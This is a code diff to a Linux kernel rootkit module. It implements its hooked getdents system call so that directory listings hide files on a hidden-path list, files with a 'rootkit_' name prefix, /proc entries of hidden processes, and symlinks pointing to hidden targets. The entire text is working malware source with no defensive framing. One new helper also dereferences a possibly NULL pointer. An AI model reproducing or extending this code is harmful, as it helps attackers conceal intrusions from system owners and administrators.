@@ -6,6 +6,7 @@
 #include <linux/delay.h>
 #include <linux/unistd.h>
 
+#include "control.h"
 #include "include.h"
 
 /* pointers to some important kernel functions/resources */
@@ -21,22 +22,31 @@ static int getdents_call_counter = 0;
 static spinlock_t *getdents_lock;
 static unsigned long getdents_lock_flags;
 
+
+/* 
+ * Gets just the file name of a full path. Can be NULL!
+ */
+char *
+get_fname_from_path(char *path)
+{
+	char *ptr, *name;
+	char delimiter = '/';
+	
+	ptr = strrchr(path, delimiter);
+	name = ptr + 1;
+	
+	return name;
+}
+
 /*
  * check if we need to hide this file because it matches
- * a path to be hidden. fd is the file descriptor for the
- * path we are currently in, *d_name is the name of the
- * file to check.
+ * a path to be hidden. *path is the path of the file
+ * to check
  */
 int
-check_hide_fpath(char *d_name)
-{
-	// TODO: loop the list of paths to hide
-	if(strcmp(d_name, d_name) == 0)
-	{
-		
-	}
-	
-	return 0;
+check_hide_fpath(char *path)
+{	
+	return is_path_hidden(path);
 }
 
 /*
@@ -44,8 +54,10 @@ check_hide_fpath(char *d_name)
  * of its prefix
  */
 int
-check_hide_fprefix(char *d_name)
+check_hide_fprefix(char *path)
 {
+	char *d_name = get_fname_from_path(path);
+	
 	// TODO: implement dynamic prefixes
 	if(strstr(d_name, "rootkit_") == d_name) 
 	{
@@ -61,18 +73,29 @@ check_hide_fprefix(char *d_name)
 
 /* 
  * check if we need to hide a file because it is the process
- * id of a hidden process. fd must match the /proc/ folder.
+ * id of a hidden process. fd must match the /proc folder.
  */
 int
 check_hide_process(int fd, char *d_name)
 {	
-	// TODO
-	
+	int ret;
+	char dir[128];
+
+	ret = get_path(fd, dir, 128);
+	if(ret <= 0) {
+		ROOTKIT_DEBUG("Something probably went wrong in check_hide_process().\n");
+		return 0;
+	}
+
+	if(strcmp(dir, "/proc") == 0) {
+		return is_process_hidden(convert_atoi(d_name));
+	}
+
 	return 0;
 }
 
 int
-check_hide_symlink(char *d_name)
+check_hide_symlink(char *path)
 {
 	mm_segment_t old_fs;
 	char lpath[128];
@@ -86,37 +109,23 @@ check_hide_symlink(char *d_name)
 		set_fs(KERNEL_DS);
 	
 		/* execute our readlinkat syscall */
-		lpath_len = (*syscall_readlink) (d_name, lpath, 128);
+		lpath_len = (*syscall_readlink) (path, lpath, 128);
 	
-		/* reset the kernel */	
+		/* reset the kernel */
 		set_fs(old_fs);
 
-		// TODO: insert stop condition
+		/* check if the current link is pointing to a hidden path */
+		if(check_hide_fpath(lpath)) {
+			return 1;
+		}
+
+		/* check if the current link is pointing to a file with a hiding prefix */
+		if(check_hide_fprefix(lpath)) {
+			return 1;
+		}
 	
 	} while (lpath_len > 0);
 
-	return 0;
-}
-
-/* 
- * Checks whether a linux_dirent is a symbolic link and if it is
- * checks whether we need to hide it, too.
- */
-int
-check_symlink(char *path)
-{
-	char *ptr, *name;
-	char delimiter = '/';
-	
-	ptr = strrchr(path, delimiter);
-	name = ptr + 1;
-	
-	if(ptr == NULL)
-	{
-		return 0;
-	}
-
-	//return hide(name);
 	return 0;
 }
 
@@ -142,13 +151,6 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 		len  = dirp->d_reclen;
 		tlen = tlen-len;
 		
-//		/* Check if we need to hide this symlink (only if it is a symlink ofc) */
-//		if(lpath_len > 0 && check_symlink(lpath))
-//		{
-//			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
-//			ret -= len;
-//		}	
-		/* Check if we need to hide this file */
 		if(check_hide_fpath(dirp->d_name)
 				|| check_hide_fprefix(dirp->d_name)
 				|| check_hide_process(fd, dirp->d_name)
